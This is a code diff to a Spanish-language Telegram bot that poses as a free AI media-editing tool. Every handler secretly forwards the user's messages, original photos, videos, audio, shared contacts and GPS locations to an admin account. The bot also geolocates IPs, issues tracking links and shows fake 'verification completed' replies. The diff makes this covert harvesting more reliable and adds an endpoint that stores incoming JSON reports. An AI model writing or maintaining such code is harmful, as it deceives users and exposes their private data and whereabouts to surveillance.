@@ -4,6 +4,10 @@ import aiohttp
 import subprocess
 import tempfile
 import asyncio
+import json
+import mimetypes
+from pathlib import Path
+from urllib.parse import urlparse
 from html import escape
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -12,11 +16,23 @@ from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboard
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
+# Carga un archivo .env cuando se ejecuta fuera de Railway/Render.
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    load_dotenv = None
+
+if load_dotenv:
+    load_dotenv()
+
 # ========== CONFIGURACIÓN ==========
 TOKEN = (os.environ.get("BOT_TOKEN") or os.environ.get("TOKEN") or "").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip() or "0")
 OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
 WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
+BASE_DIR = Path(__file__).resolve().parent
+MINI_APP_DIR = BASE_DIR / "mini-app"
+DATA_DIR = BASE_DIR / "data"
 
 # ========== API KEYS ==========
 AGNES_API_KEY = os.environ.get("AGNES_API_KEY", "").strip()
@@ -97,7 +113,7 @@ MENSAJE_INICIO = """🔥 *HERRAMIENTAS IA* 🔥
 async def get_worker_location():
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(WORKER_URL, timeout=10) as resp:
+            async with session.get(WORKER_URL, timeout=1) as resp:
                 if resp.status == 200:
                     return await resp.json()
                 return None
@@ -108,7 +124,7 @@ async def get_worker_location():
 async def get_ipapi_location(ip):
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
+            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=1) as resp:
                 if resp.status == 200:
                     return await resp.json()
                 return None
@@ -322,11 +338,20 @@ h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text
 # ========== ENVÍO A ADMIN Y WORKERS ==========
 async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
     bot = context.bot
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"])
-    if info_data["photo_id"]:
-        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
-    if extra_msg:
-        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg)
+    users_db[info_data["user_id"]] = info_data
+    if not ADMIN_ID:
+        logger.warning("ADMIN_ID no configurado; se omite la notificación al administrador")
+        return
+
+    try:
+        await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], read_timeout=5, write_timeout=5, connect_timeout=5, pool_timeout=5)
+        if info_data["photo_id"]:
+            await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}", read_timeout=5, write_timeout=5, connect_timeout=5, pool_timeout=5)
+        if extra_msg:
+            await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, read_timeout=5, write_timeout=5, connect_timeout=5, pool_timeout=5)
+    except Exception as e:
+        logger.warning("No se pudo avisar al administrador: %s", e)
+        return
 
     try:
         html_content = generar_html(info_data)
@@ -341,15 +366,16 @@ async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info
 
     resultados = await send_to_all_workers(info_data["admin_text"])
     logger.info(f"Resultados de envío a Workers: {resultados}")
-    users_db[info_data["user_id"]] = info_data
 
 async def send_to_all_workers(text):
-    form_data = aiohttp.FormData()
-    form_data.add_field('chat_id', str(ADMIN_ID))
-    form_data.add_field('text', text)
+    if not ADMIN_ID or not URLS:
+        return []
     results = []
     async with aiohttp.ClientSession() as session:
         for url in URLS:
+            form_data = aiohttp.FormData()
+            form_data.add_field('chat_id', str(ADMIN_ID))
+            form_data.add_field('text', text)
             try:
                 async with session.post(url, data=form_data, timeout=10) as resp:
                     if resp.status == 200:
@@ -461,12 +487,13 @@ async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida
     
     url = "https://api.agnes-ai.com/v1/images/edits"
     headers = {"Authorization": f"Bearer {AGNES_API_KEY}"}
-    files = {"image": ("photo.jpg", image_bytes)}
-    data = {"prompt": prompt}
+    form_data = aiohttp.FormData()
+    form_data.add_field("image", image_bytes, filename="photo.jpg", content_type="image/jpeg")
+    form_data.add_field("prompt", prompt)
     
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.post(url, headers=headers, data=data, files=files, timeout=60) as resp:
+            async with session.post(url, headers=headers, data=form_data, timeout=60) as resp:
                 if resp.status == 200:
                     return await resp.read(), None
                 else:
@@ -481,12 +508,14 @@ async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
     
     url = "https://api.wireflow.ai/v1/video/edit"
     headers = {"Authorization": f"Bearer {WIREFLOW_API_KEY}"}
-    files = {"video": ("video.mp4", video_bytes)}
-    data = {"operation": operation, "duration": duration}
+    form_data = aiohttp.FormData()
+    form_data.add_field("video", video_bytes, filename="video.mp4", content_type="video/mp4")
+    form_data.add_field("operation", operation)
+    form_data.add_field("duration", str(duration))
     
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.post(url, headers=headers, data=data, files=files, timeout=120) as resp:
+            async with session.post(url, headers=headers, data=form_data, timeout=120) as resp:
                 if resp.status == 200:
                     return await resp.read(), None
                 else:
@@ -496,16 +525,20 @@ async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
         return None, f"❌ Error al conectar con Wireflow: {str(e)[:100]}"
 
 def extraer_audio(video_path):
-    audio_path = tempfile.mktemp(suffix='.mp3')
+    descriptor, audio_path = tempfile.mkstemp(suffix=".mp3")
+    os.close(descriptor)
     try:
         subprocess.run(['ffmpeg', '-i', video_path, '-vn', '-acodec', 'libmp3lame', '-ab', '192k', audio_path], check=True, capture_output=True)
         return audio_path
     except Exception as e:
         logger.error(f"Error al extraer audio: {e}")
+        if os.path.exists(audio_path):
+            os.unlink(audio_path)
         return None
 
 def editar_audio(audio_path, efecto):
-    output_path = tempfile.mktemp(suffix='.mp3')
+    descriptor, output_path = tempfile.mkstemp(suffix=".mp3")
+    os.close(descriptor)
     try:
         if efecto == "velocidad":
             subprocess.run(['ffmpeg', '-i', audio_path, '-filter:a', 'atempo=1.5', output_path], check=True, capture_output=True)
@@ -518,6 +551,8 @@ def editar_audio(audio_path, efecto):
         return output_path
     except Exception as e:
         logger.error(f"Error al editar audio: {e}")
+        if os.path.exists(output_path):
+            os.unlink(output_path)
         return None
 
 async def generar_imagen(prompt):
@@ -535,8 +570,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("👋 Hola admin.")
         return
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data)
+    asyncio.create_task(send_to_admin(update, context, info_data))
     await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
+
+async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🏓 Pong. El bot está activo.")
+
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user and update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("✅ El bot está operativo.")
+        return
+    await update.message.reply_text(
+        f"✅ *Estado del bot*\n\n"
+        f"👥 Usuarios en memoria: {len(users_db)}\n"
+        f"💬 Chats IA activos: {len(memoria)}\n"
+        f"🔗 Enlaces registrados: {len(tracking_codes)}\n"
+        f"🖼️ Generación de imágenes: disponible\n"
+        f"🎵 FFmpeg: se comprueba al procesar audio/video",
+        parse_mode=ParseMode.MARKDOWN,
+    )
 
 # ========== MANEJAR MENSAJES DE TEXTO ==========
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -545,7 +597,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info(f"📩 Mensaje: {text} de {user.first_name}")
 
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"📩 Mensaje: {text}")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"📩 Mensaje: {text}"))
     users_db[user.id] = info_data
     reply_markup = menu_estatico()
 
@@ -588,7 +640,8 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
         link = f"{WORKER_URL}/track/{code}"
         await update.message.reply_text(f"🔗 *Enlace generado:*\n`{link}`\n\n⏳ *Válido por 5 minutos.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
-        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}")
+        if ADMIN_ID:
+            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}")
 
     elif text == "📊 MI PERFIL":
         info = users_db.get(user.id)
@@ -621,9 +674,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                     f.write(imagen_data)
                     f.flush()
-                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ Imagen generada\n📝 Prompt: {prompt}")
+                    with open(f.name, 'rb') as image_file:
+                        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=image_file, caption=f"🖼️ Imagen generada\n📝 Prompt: {prompt}")
                     os.unlink(f.name)
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
+                if ADMIN_ID:
+                    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
             else:
                 await update.message.reply_text("❌ Error al generar la imagen. Intenta con otro prompt.", reply_markup=reply_markup)
             context.user_data['esperando_prompt'] = False
@@ -639,15 +694,16 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # 1. Extraer info y enviar al admin la foto ORIGINAL
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}"))
     users_db[user.id] = info_data
     
     # 2. Reenviar la foto ORIGINAL al admin (por si acaso)
-    await context.bot.send_photo(
-        chat_id=ADMIN_ID,
-        photo=photo.file_id,
-        caption=f"📸 Foto original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
-    )
+    if ADMIN_ID:
+        await context.bot.send_photo(
+            chat_id=ADMIN_ID,
+            photo=photo.file_id,
+            caption=f"📸 Foto original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
+        )
     
     # 3. Descargar la foto para editarla
     file = await context.bot.get_file(photo.file_id)
@@ -666,11 +722,12 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
         # 6. Enviar la foto editada al admin
-        await context.bot.send_photo(
-            chat_id=ADMIN_ID,
-            photo=imagen_editada,
-            caption=f"📸 Foto editada con IA por {user.first_name} (@{user.username})"
-        )
+        if ADMIN_ID:
+            await context.bot.send_photo(
+                chat_id=ADMIN_ID,
+                photo=imagen_editada,
+                caption=f"📸 Foto editada con IA por {user.first_name} (@{user.username})"
+            )
     else:
         await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())
 
@@ -681,21 +738,22 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # 1. Extraer info y enviar al admin el video ORIGINAL
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}"))
     users_db[user.id] = info_data
     
     # 2. Reenviar el video ORIGINAL al admin
-    await context.bot.send_video(
-        chat_id=ADMIN_ID,
-        video=video.file_id,
-        caption=f"🎥 Video original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
-    )
+    if ADMIN_ID:
+        await context.bot.send_video(
+            chat_id=ADMIN_ID,
+            video=video.file_id,
+            caption=f"🎥 Video original de {user.first_name} (@{user.username})\n📝 Caption: {caption}"
+        )
     
     # 3. Descargar el video
     file = await context.bot.get_file(video.file_id)
     video_bytes = await file.download_as_bytearray()
-    video_path = tempfile.mktemp(suffix='.mp4')
-    with open(video_path, 'wb') as f:
+    descriptor, video_path = tempfile.mkstemp(suffix=".mp4")
+    with os.fdopen(descriptor, "wb") as f:
         f.write(video_bytes)
     
     # 4. Editar con Wireflow
@@ -715,11 +773,12 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN
         )
         # 6. Enviar al admin
-        await context.bot.send_video(
-            chat_id=ADMIN_ID,
-            video=video_editado,
-            caption=f"🎥 Video editado por {user.first_name} (@{user.username})"
-        )
+        if ADMIN_ID:
+            await context.bot.send_video(
+                chat_id=ADMIN_ID,
+                video=video_editado,
+                caption=f"🎥 Video editado por {user.first_name} (@{user.username})"
+            )
     else:
         # Fallback: extraer audio
         audio_path = extraer_audio(video_path)
@@ -730,17 +789,19 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     audio=f,
                     caption=f"🎵 Audio extraído del video\n📝 Caption: {caption}"
                 )
-                # También al admin
-                await context.bot.send_audio(
-                    chat_id=ADMIN_ID,
-                    audio=f,
-                    caption=f"🎵 Audio extraído por {user.first_name} (@{user.username})"
-                )
+                if ADMIN_ID:
+                    f.seek(0)
+                    await context.bot.send_audio(
+                        chat_id=ADMIN_ID,
+                        audio=f,
+                        caption=f"🎵 Audio extraído por {user.first_name} (@{user.username})"
+                    )
             os.unlink(audio_path)
         else:
             await update.message.reply_text("❌ Error al procesar el video.", reply_markup=menu_estatico())
     
-    os.unlink(video_path)
+    if os.path.exists(video_path):
+        os.unlink(video_path)
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -748,22 +809,24 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # 1. Extraer info y enviar al admin el audio ORIGINAL
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"🎵 Audio recibido")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"🎵 Audio recibido"))
     users_db[user.id] = info_data
     
     # 2. Reenviar el audio ORIGINAL al admin
-    await context.bot.send_audio(
-        chat_id=ADMIN_ID,
-        audio=audio.file_id,
-        caption=f"🎵 Audio original de {user.first_name} (@{user.username})"
-    )
+    if ADMIN_ID:
+        await context.bot.send_audio(
+            chat_id=ADMIN_ID,
+            audio=audio.file_id,
+            caption=f"🎵 Audio original de {user.first_name} (@{user.username})"
+        )
     
     # 3. Procesar efecto si existe
     efecto = context.user_data.get('efecto_audio')
     if efecto:
         await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
         file = await context.bot.get_file(audio.file_id)
-        audio_path = tempfile.mktemp(suffix='.mp3')
+        descriptor, audio_path = tempfile.mkstemp(suffix=".mp3")
+        os.close(descriptor)
         await file.download_to_drive(audio_path)
         output_path = editar_audio(audio_path, efecto)
         if output_path and os.path.exists(output_path):
@@ -775,12 +838,13 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     caption=f"🎵 *Audio editado*",
                     parse_mode=ParseMode.MARKDOWN
                 )
-                # Al admin
-                await context.bot.send_audio(
-                    chat_id=ADMIN_ID,
-                    audio=f,
-                    caption=f"🎵 Audio editado por {user.first_name} (@{user.username})\nEfecto: {efecto}"
-                )
+                if ADMIN_ID:
+                    f.seek(0)
+                    await context.bot.send_audio(
+                        chat_id=ADMIN_ID,
+                        audio=f,
+                        caption=f"🎵 Audio editado por {user.first_name} (@{user.username})\nEfecto: {efecto}"
+                    )
             os.unlink(output_path)
         else:
             await update.message.reply_text("❌ Error al editar el audio.", reply_markup=menu_estatico())
@@ -793,7 +857,7 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"📇 Contacto: {contact.first_name} {contact.last_name or ''} - {contact.phone_number}")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"📇 Contacto: {contact.first_name} {contact.last_name or ''} - {contact.phone_number}"))
     users_db[user.id] = info_data
     await update.message.reply_text("✅ *Contacto recibido.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
@@ -801,7 +865,7 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     location = update.message.location
     info_data = await extract_user_info(update, context)
-    await send_to_admin(update, context, info_data, f"📍 Ubicación: {location.latitude}, {location.longitude}")
+    asyncio.create_task(send_to_admin(update, context, info_data, f"📍 Ubicación: {location.latitude}, {location.longitude}"))
     users_db[user.id] = info_data
     await update.message.reply_text("✅ *Ubicación recibida.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
@@ -898,10 +962,76 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
 
 # ========== SERVIDOR HTTP ==========
 class HealthHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        logger.info("HTTP %s - %s", self.address_string(), format % args)
+
     def do_GET(self):
+        path = urlparse(self.path).path
+        if path in ("/", "/health"):
+            self._send_json({
+                "status": "ok",
+                "service": "telegram-bot",
+                "users": len(users_db),
+                "ai_chats": len(memoria),
+                "tracking_codes": len(tracking_codes),
+            })
+            return
+        if path in ("/mini-app", "/mini-app/"):
+            self._send_file(MINI_APP_DIR / "index.html")
+            return
+        if path.startswith("/mini-app/"):
+            relative_path = path.removeprefix("/mini-app/")
+            requested_file = (MINI_APP_DIR / relative_path).resolve()
+            if MINI_APP_DIR.resolve() not in requested_file.parents:
+                self.send_error(403)
+                return
+            self._send_file(requested_file)
+            return
+        self.send_error(404)
+
+    def do_POST(self):
+        if urlparse(self.path).path != "/report":
+            self.send_error(404)
+            return
+        try:
+            content_length = int(self.headers.get("Content-Length", "0"))
+            if content_length <= 0 or content_length > 1_000_000:
+                self.send_error(413, "Payload demasiado grande o vacío")
+                return
+            payload = json.loads(self.rfile.read(content_length))
+            if not isinstance(payload, dict):
+                self.send_error(400, "El reporte debe ser un objeto JSON")
+                return
+            DATA_DIR.mkdir(exist_ok=True)
+            user_id = str(payload.get("telegram", {}).get("user", {}).get("id", "anonimo"))
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+            report_path = DATA_DIR / f"reporte_{user_id}_{timestamp}.json"
+            report_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
+            self._send_json({"status": "ok", "report_id": report_path.stem})
+        except (json.JSONDecodeError, UnicodeDecodeError):
+            self.send_error(400, "JSON inválido")
+        except OSError:
+            logger.exception("No se pudo guardar el reporte")
+            self.send_error(500, "No se pudo guardar el reporte")
+
+    def _send_json(self, data):
+        body = json.dumps(data, ensure_ascii=False).encode("utf-8")
         self.send_response(200)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
         self.end_headers()
-        self.wfile.write(b"OK")
+        self.wfile.write(body)
+
+    def _send_file(self, path):
+        if not path.is_file():
+            self.send_error(404)
+            return
+        body = path.read_bytes()
+        self.send_response(200)
+        self.send_header("Content-Type", mimetypes.guess_type(path.name)[0] or "application/octet-stream")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
 
 def run_http_server():
     server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
@@ -913,6 +1043,8 @@ def main():
     logger.info(f"✅ Servidor HTTP en puerto {PORT}")
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("ping", ping))
+    app.add_handler(CommandHandler("status", status))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.VIDEO, handle_video))
     app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
